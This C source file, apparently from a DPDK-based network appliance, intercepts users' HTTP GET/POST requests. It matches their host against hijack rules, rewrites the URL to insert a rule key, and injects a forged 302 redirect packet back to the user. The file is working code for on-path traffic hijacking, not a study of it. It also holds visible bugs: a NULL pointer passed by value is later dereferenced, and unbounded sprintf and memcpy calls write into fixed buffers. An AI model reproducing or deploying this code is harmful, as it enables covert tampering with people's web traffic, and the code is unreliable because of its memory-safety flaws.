#include "boots.h"
#include "bts_debug.h"
#include "bts_cnt.h"

#include "naga_types.h"
#include "naga_hijack.h"
#include "itf.h"
#include "packet.h"
#include "packet_http.h"
#include "hijack_cmd.h"
#include "hijack.h"
#include "bts_util.h"


#define DEBUG
#ifdef  DEBUG   
#define debug(fmt,args...)  printf ("func(%s), line(%d)"fmt"\n" ,__FUNCTION__, __LINE__, ##args)
#else   
#define debug(fmt,args...)   
#endif  /* DEBUG */ 

static uint64_t  g_hijack_ip_cnt = 0; 
extern uint32_t  g_hijack_ip_interval;
extern uint32_t  g_hijack_ip_num_interval;



#define MAX_IP_ENTRY_NUM 100

#if 0
berr hijack_switch_set(int on)
{
    g_hijack_push_switch = on; 
    return E_SUCCESS;
}



berr hijack_switch_get(int *on)
{
    *on = g_hijack_push_switch ; 
    return E_SUCCESS;
}


berr hijack_set_interval(int interval)
{
    g_hijack_interval = interval;
    return E_SUCCESS;
}

berr hijack_get_interval(int *interval)
{
    *interval = g_hijack_interval ;
    //*hijack_cnt =  CNT_GET(ADP_ALL_CAN_PUSH);
    //*success = CNT_GET(ADP_PUSH_TX_SUCCESS);
    return E_SUCCESS;
}

berr hijack_clear_interval(void)
{
	CNT_SET(ADP_ALL_CAN_PUSH, 0);
	CNT_SET(ADP_PUSH_TX_SUCCESS, 0);
	CNT_SET(ADP_PUSH_ACK_SUCCESS, 0);	
    return E_SUCCESS;
}


extern struct rte_mempool * l2fwd_pktmbuf_pool;

static inline struct rte_mbuf *rte_pktmbuf_real_clone(struct rte_mbuf *md,
    struct rte_mempool *mp)
{
  struct rte_mbuf *mc;
  if (unlikely ((mc = rte_pktmbuf_alloc(mp)) == NULL))
    return (NULL);
  /* copy data */
  rte_memcpy((void *)mc, (void *)md, (size_t) mp->elt_size);

  /* update the addr */
  mc->buf_addr = (char *)mc + sizeof(struct rte_mbuf);
  mc->buf_physaddr = rte_mempool_virt2phy(mp, mc) +
      sizeof(struct rte_mbuf);
  __rte_mbuf_sanity_check(mc, 1);

  /* dump */
#if 0
  printf("old mbuf:\n");
  rte_pktmbuf_dump(stdout, md, md->pkt_len);
  printf("new mbuf:\n");
  rte_pktmbuf_dump(stdout, mc, mc->pkt_len);
#endif
  return (mc);
}
#endif     



static hijack_ip_t *hijack_ip_new(void)
{
	hijack_ip_t *entry = NULL;

	entry = malloc(sizeof(hijack_ip_t));
	if (NULL != entry)
	{
		memset(entry, 0, sizeof(hijack_ip_t));
	}

	return entry;
}

static berr ip_session_process(uint32_t ip, hijack_ip_t *entry)
{
    char ip_str[MAX_IPSTR_LEN] = {0};
    bts_ip_string(ip, ip_str);

    entry = api_hijack_ip_get(ip_str);
    if (NULL == entry)
    {
        entry = hijack_ip_new();
        if (NULL == entry)
        {
            return E_FAIL;
        }
        if (api_hijack_ip_add(entry)) 
        {
            return E_FAIL;
        }
    }
    ACL_HIT(entry->acl);
    return E_SUCCESS;
}


static berr hijack_rule_match(char *host, hijack_rule_t **rule)
{
    int i;
	hijack_entry_t *ptr = NULL;

	ptr = api_get_hijack_table_ptr();
	if ((NULL == ptr)||(NULL == rule) ||(NULL == host))
	{
		return E_FAIL;
	}
	
    for ( i = 0; i < HIJACK_RULE_NUM_MAX; i++)
    {

		if(ptr[i].effective == HIJACK_RULE_UNEFFECTIVE)
		{
			continue;			
		}
		if (!strncmp(host, ptr[i].hijack.host, strlen(host)))
		{
			*rule = &ptr[i].hijack;
			return E_SUCCESS;
		}
		else
		{
			continue;
		}
		
    }
    return E_NULL;
}


berr naga_hijack(hytag_t *hytag)
{

    berr rv;
    //char *rear = NULL;
    struct rte_mbuf *txm = NULL;
    //struct rte_mbuf *m = NULL;
	unsigned char buffer[2048]; 

    hijack_ip_t *entry = NULL;
    hijack_rule_t *rule = NULL;
    char hijack_url[512] = {0};
    char uri_interval[512]  = {0};

    CNT_INC(HIJACK_IPKTS);

    if(( NULL == hytag) || (NULL == hytag->m))
    {
        //CNT_INC(ADP_DROP_PARAM);
        BRET(E_PARAM);
    }

    /* */
    if( APP_TYPE_HTTP_GET_OR_POST != hytag->app_type)
    {
        CNT_INC(HIJACK_DROP_GET_OR_POST);
        return E_SUCCESS;
    }

    /*check The First char*/
#if 0
	if(hytag->uri[0] == '/' && hytag->host_len > 0 && hytag->uri_len > 0)
	{
		hytag->url_len= snprintf(hytag->url, URL_MAX_LEN, "http://%s%s",
                                                hytag->host, hytag->uri);
	}
#endif

    
    g_hijack_ip_cnt ++;
    if (g_hijack_ip_cnt % g_hijack_ip_interval != 0)
    {
        return E_SUCCESS;
    }

    if(hytag->uri_len == 1 && !strcmp(hytag->uri, "/"))
    {    
        CNT_INC(URL_HOMEPAGE);
        return E_SUCCESS;
    }

    if(E_SUCCESS != ip_session_process(hytag->outer_srcip4, entry))
    {
        CNT_INC(HIJACK_IP_SESSION_FAIL);
        return E_SUCCESS;
    }
    
    if ((uint64_t)(entry->acl.cnt.cnt) % g_hijack_ip_num_interval != 0)
    {
        return E_SUCCESS;
    }
	
	CYCLE_INIT(1);

    txm = hytag->m;

    
    if(E_SUCCESS != hijack_rule_match((char *)hytag->host, &rule))
    {
        CNT_INC(HIJACK_HOST_NOT_MATCH);
        return E_SUCCESS;
    }
    
    if (NULL != strstr(hytag->uri, rule->key))
    {
        return E_SUCCESS;
    }

    if (HIJACK_URL_MODE == rule->mode)
    {
        sprintf(hijack_url, "http://%s%s", rule->host, rule->key);
    }
    else
    {
        char *locate_ptr = strstr(hytag->uri, rule->locate);       
        if (NULL == locate_ptr)
        {
            return E_SUCCESS;
        }
        else
        {
            memcpy(uri_interval, hytag->uri, (hytag->uri_len - strlen(locate_ptr)));
            char *key_end_ptr = strstr(locate_ptr, "&");
            if (NULL == key_end_ptr)
            {
                sprintf(hijack_url, "http://%s%s%s%s", rule->host, uri_interval, rule->locate, rule->key);
                printf("%s.%d: Dst url is : %s, src url is http://%s/%s", 
                       __func__, __LINE__, hijack_url, hytag->host, hytag->uri);
            }
            else
            {
                sprintf(hijack_url, "http://%s%s%s%s%s", rule->host, uri_interval, rule->locate, rule->key, key_end_ptr);
                printf("%s.%d: Dst url is : %s, src url is http://%s/%s", 
                       __func__, __LINE__, hijack_url, hytag->host, hytag->uri);
            }
        }
    }

    if(hytag->eth_tx == ENABLE)
    {
	    CYCLE_START();


	    memcpy(buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
	    rv = redirect_302_response_generator(buffer, hytag, hijack_url);

	    if(rv != E_SUCCESS) {
		    CNT_INC(HIJACK_DROP_HEAD_GEN1);
		    return rv;
	    }

	    CYCLE_END();

	    CYCLE_START();
	    rv = ift_raw_send_packet(hytag->fp, buffer, hytag->data_len);
	    if(rv != E_SUCCESS)
	    {
		    printf("Send packet Failed\n");
		    CNT_INC(HIJACK_DROP_SEND_PACKET1);
		    return rv;
	    }
	    CYCLE_END();
   }  
   else
   {

    	    rv = redirect_302_response_generator(hytag->pbuf.ptr, hytag, hijack_url);
	    if(rv != E_SUCCESS) {
		    CNT_INC(HIJACK_DROP_HEAD_GEN1);
		    return rv;
	    }

	    txm->data_len = txm->pkt_len = hytag->data_len;
	    itf_send_packet_imm(txm, txm->port);

   }

   CNT_INC(HIJACK_PUSH_TX_SUCCESS);
   return E_SUCCESS;

}



void hijack_dp_init(void)
{
	berr rv;
	rv = hijack_ip_init(MAX_IP_ENTRY_NUM);
	if (E_SUCCESS != rv)
	{
		printf("Hijack init FAIL!\n");
	}
	else
	{
		printf("Hijack init success!\n");
	}

    hijack_init();
	return;
}



#if 0
time_t   hijack_timep; 
berr hijack_dp_init(void)
{   
   //berr rv; 
   //cmdline_hijack_init();
   time(&hijack_timep);    
   return E_SUCCESS;
}

time_t *hijack_get_start_time(void)
{
    return   &hijack_timep;
}
#endif
